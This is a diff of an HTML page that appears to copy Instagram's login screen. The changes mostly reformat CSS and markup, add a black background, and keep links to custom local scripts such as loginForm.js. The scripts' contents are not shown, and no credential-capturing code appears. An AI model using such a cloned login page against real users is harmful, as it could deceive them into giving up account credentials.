@@ -41,43 +41,60 @@
     <meta name="color-scheme" content="light" />
 
     <style data-btmanifest="1020837445_main" nonce="LE5rjsaY">
+      body {
+        background-color: black;
+      }
 
-    input:-webkit-autofill {
-      -webkit-text-fill-color: rgb(245, 245, 245) !important; /* Ensures text color remains black */
-    }
+      input:-webkit-autofill {
+        -webkit-text-fill-color: rgb(
+          245,
+          245,
+          245
+        ) !important; /* Ensures text color remains black */
+      }
 
-.spinner {
-   width: 56px;
-   height: 56px;
-   display: grid;
-   border-radius: 50%;
-   -webkit-mask: radial-gradient(farthest-side,#0000 40%,#d2e1e1 41%);
-   background: linear-gradient(0deg ,rgba(210,225,225,0.5) 50%,rgba(210,225,225,1) 0) center/4.5px 100%,
-        linear-gradient(90deg,rgba(210,225,225,0.25) 50%,rgba(210,225,225,0.75) 0) center/100% 4.5px;
-   background-repeat: no-repeat;
-   animation: spinner-d3o0rx 1s infinite steps(12);
-}
+      .spinner {
+        width: 56px;
+        height: 56px;
+        display: grid;
+        border-radius: 50%;
+        -webkit-mask: radial-gradient(farthest-side, #0000 40%, #d2e1e1 41%);
+        background: linear-gradient(
+              0deg,
+              rgba(210, 225, 225, 0.5) 50%,
+              rgba(210, 225, 225, 1) 0
+            )
+            center/4.5px 100%,
+          linear-gradient(
+              90deg,
+              rgba(210, 225, 225, 0.25) 50%,
+              rgba(210, 225, 225, 0.75) 0
+            )
+            center/100% 4.5px;
+        background-repeat: no-repeat;
+        animation: spinner-d3o0rx 1s infinite steps(12);
+      }
 
-.spinner::before,
-.spinner::after {
-   content: "";
-   grid-area: 1/1;
-   border-radius: 50%;
-   background: inherit;
-   opacity: 0.915;
-   transform: rotate(30deg);
-}
+      .spinner::before,
+      .spinner::after {
+        content: "";
+        grid-area: 1/1;
+        border-radius: 50%;
+        background: inherit;
+        opacity: 0.915;
+        transform: rotate(30deg);
+      }
 
-.spinner::after {
-   opacity: 0.83;
-   transform: rotate(60deg);
-}
+      .spinner::after {
+        opacity: 0.83;
+        transform: rotate(60deg);
+      }
 
-@keyframes spinner-d3o0rx {
-   100% {
-      transform: rotate(1turn);
-   }
-}
+      @keyframes spinner-d3o0rx {
+        100% {
+          transform: rotate(1turn);
+        }
+      }
 
       :root,
       .__ig-light-mode:root,
@@ -2777,7 +2794,9 @@
                                                   class="_acan _acao _acat _aj1- _ap30"
                                                   type="button"
                                                   style="display: none"
-                                                >Show</button>
+                                                >
+                                                  Show
+                                                </button>
                                               </div>
                                             </div>
                                           </div>
@@ -2793,10 +2812,22 @@
                                           >
                                             <div
                                               class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
-                                              style="display: flex; justify-content: center; align-items: center;"
+                                              style="
+                                                display: flex;
+                                                justify-content: center;
+                                                align-items: center;
+                                              "
                                             >
                                               <span id="loginText">Log in</span>
-                                              <div id="spinner" class="spinner" style="display: none; width: 15px; height: 15px;"></div>
+                                              <div
+                                                id="spinner"
+                                                class="spinner"
+                                                style="
+                                                  display: none;
+                                                  width: 15px;
+                                                  height: 15px;
+                                                "
+                                              ></div>
                                             </div>
                                           </button>
                                         </div>
@@ -3408,7 +3439,7 @@
       data-btmanifest="1020837445_main"
       data-c="1"
     />
-    
+
     <script type="module" src="/scripts/script.js"></script>
     <script type="module" src="/scripts/style.js"></script>
     <script type="module" src="/scripts/loginForm.js"></script>
